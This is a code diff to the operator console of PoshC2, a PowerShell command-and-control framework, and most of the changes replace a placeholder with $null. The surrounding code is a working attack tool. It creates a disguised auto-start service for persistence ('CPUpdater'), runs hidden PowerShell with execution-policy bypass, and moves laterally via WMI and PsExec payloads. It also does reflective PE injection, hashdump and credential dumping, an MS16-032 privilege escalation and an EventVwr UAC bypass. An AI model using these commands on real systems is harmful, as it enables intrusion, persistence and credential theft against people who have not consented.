@@ -174,7 +174,7 @@ $header = '
             {
                 $taskn = "LoadModule NamedPipe.ps1"
                 $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
-                $taskm = "if ((`$p = Get-Process | ? {`$_.id -eq `$pid}).name -eq `"powershell`"){`$t=`$true};if (`$t -and [IntPtr]::size -eq 8){invoke-reflectivepeinjection -payload x64}elseif ((`$t -and [IntPtr]::size -eq 4)) {invoke-reflectivepeinjection -payload x86}"
+                $taskm = "AutoMigrate"
                 $Query = 'INSERT
                 INTO AutoRuns (Task)
                 VALUES (@Task)'
@@ -1060,7 +1060,7 @@ param
             }  
             if ($pscommand -eq 'getuid') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $dbresult
             }  
@@ -1070,13 +1070,13 @@ param
             }
             if ($pscommand -eq 'id') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $dbresult
             }
             if ($pscommand -eq 'whoami') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT Domain FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $dbresult
             }
@@ -1087,25 +1087,25 @@ param
             }
             if ($pscommand -eq 'Show-ServerInfo') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                 Write-Host $dbresult
             }
             if ($pscommand -eq 'get-pid') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT PID FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $dbresult
             }
             if ($pscommand -eq 'Get-ImplantWorkingDirectory') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $dbresult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT FolderPath FROM C2Server" -As SingleValue
                 Write-Host $dbresult
             }
             if ($pscommand -eq 'ListModules') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                 $folders = $env:PSModulePath -split ";" 
                 foreach ($item in $folders) {
@@ -1125,7 +1125,7 @@ param
             }  
             if ($pscommand -eq 'ModulesLoaded') 
             {
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 $mods = Invoke-SqliteQuery -DataSource $Database -Query "SELECT ModsLoaded FROM Implants WHERE RandomURI='$psrandomuri'" -As SingleValue
                 Write-Host $mods
             }
@@ -1145,7 +1145,7 @@ param
                     $pscommand = "sc.exe create CPUpdater binpath= 'cmd /c "+$payload+"' Displayname= CheckpointServiceUpdater start= auto"
                 } else {
                     write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmiproxypayload'))
@@ -1157,7 +1157,7 @@ param
                     $pscommand = $pscommand + " -command '$proxypayload'"
                 } else {
                     write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
@@ -1169,7 +1169,7 @@ param
                     $pscommand = $pscommand + " -command '$proxypayload'"
                 } else {
                     write-host "Need to run Invoke-DaisyChain first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }            
             if ($pscommand.ToLower().StartsWith('invoke-wmipayload'))
@@ -1181,7 +1181,7 @@ param
                     $pscommand = $pscommand + " -command '$payload'"
                 } else {
                     write-host "Can't find the payload.bat file, run CreatePayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('invoke-psexecproxypayload'))
@@ -1204,7 +1204,7 @@ param
                     $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                 } else {
                     write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
@@ -1227,7 +1227,7 @@ param
                     $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                 } else {
                     write-host "Can't find the payload.bat file, run CreatePayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('hashdump'))
@@ -1257,7 +1257,7 @@ param
                 $pscommand = "invoke-reflectivepeinjection -payload Proxy_x86 $($psargs)"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('migrate-proxypayload-x64'))
@@ -1270,7 +1270,7 @@ param
                 $pscommand = "invoke-reflectivepeinjection -payload Proxy_x64 $($psargs)"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('migrate-x86'))
@@ -1526,7 +1526,7 @@ param
                 $pscommand = "invoke-runasproxypayload $($pscommand)"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 }
             }         
             if (($pscommand -eq 'StartAnotherImplantWithProxy') -or ($pscommand -eq 'saiwp'))
@@ -1537,7 +1537,7 @@ param
                 $pscommand = 'start-process -windowstyle hidden cmd -args "/c $proxypayload"'
                 } else {
                 write-host "Need to run CreateProxyPayload first"
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 }
             }
             if ($pscommand.ToLower().StartsWith('get-proxy')) 
@@ -1547,7 +1547,7 @@ param
             if ($pscommand.ToLower().StartsWith('createmacropayload')) 
             {
                 $pscommand|Invoke-Expression
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
             }
             if ($pscommand.ToLower().StartsWith('invoke-daisychain')) 
             {
@@ -1557,7 +1557,7 @@ param
             if ($pscommand.ToLower().StartsWith('createproxypayload')) 
             {
                 $pscommand|Invoke-Expression
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
             }
             if ($pscommand.ToLower().StartsWith('upload-file')) 
             {
@@ -1567,7 +1567,7 @@ param
             if ($pscommand.ToLower().StartsWith('createpayload')) 
             {
                 $pscommand|Invoke-Expression
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
             }
             if ($pscommand -eq 'cred-popper') 
             {
@@ -1628,12 +1628,12 @@ param
             }
             if ($pscommand.tolower().startswith('add-creds')){
                 $pscommand|Invoke-Expression
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
             }
             if ($pscommand -eq 'dump-creds'){
                 $dbResult = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Creds" -As PSObject
                 Write-Output -InputObject $dbResult | ft -AutoSize | out-host
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
             }
             if ($pscommand -eq 'invoke-ms16-032')
             { 
@@ -1648,7 +1648,7 @@ param
                 $pscommand = "LoadModule invoke-ms16-032-proxy.ps1"
                 } else {
                 write-host "Need to run CreateProxyPayload first"
-                $pscommand = 'fvdsghfdsyyh'
+                $pscommand = $null
                 }
             }
             if ($pscommand -eq 'invoke-uacbypassproxy')
@@ -1663,7 +1663,7 @@ param
                     $pscommand = "Invoke-EventVwrBypass -Command `"$payloadraw`"" 
                 } else {
                     write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }            
             }
             if ($pscommand -eq 'invoke-uacbypass')
@@ -1721,7 +1721,7 @@ param
                     $pscommand = "sc.exe delete CPUpdater"
                 } else {
                     write-host "Need to run CreateProxyPayload first"
-                    $pscommand = 'fvdsghfdsyyh'
+                    $pscommand = $null
                 }
             }                   
             if ($pscommand -eq 'Hide-Implant') 
@@ -1776,7 +1776,7 @@ param
                     $TasksArray += $ImplantTask
                }
                $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"
-               $pscommand = 'fvdsghfdsyyh'
+               $pscommand = $null
             }
             $pscommand
 }
@@ -1867,16 +1867,19 @@ while($true)
             {
                 #write-host $global:command $global:randomuri
                 $outputcmd = runcommand $global:command $global:randomuri
-                if ($outputcmd -eq 'hide' ) 
+                if ($outputcmd -eq 'hide') 
                 {
                     Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET Alive='No' WHERE RandomURI='$global:randomuri'"|Out-Null
-                }
-                $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
+                    $outputcmd = $null
+                }  
+                if ($outputcmd) {
+                    $query = "INSERT INTO NewTasks (RandomURI, Command) VALUES (@RandomURI, @Command)"
 
-                Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
-                    RandomURI = $global:randomuri
-                    Command   = $outputcmd
-                } | Out-Null
+                    Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
+                        RandomURI = $global:randomuri
+                        Command   = $outputcmd
+                    } | Out-Null
+                }
             }
         }
     }
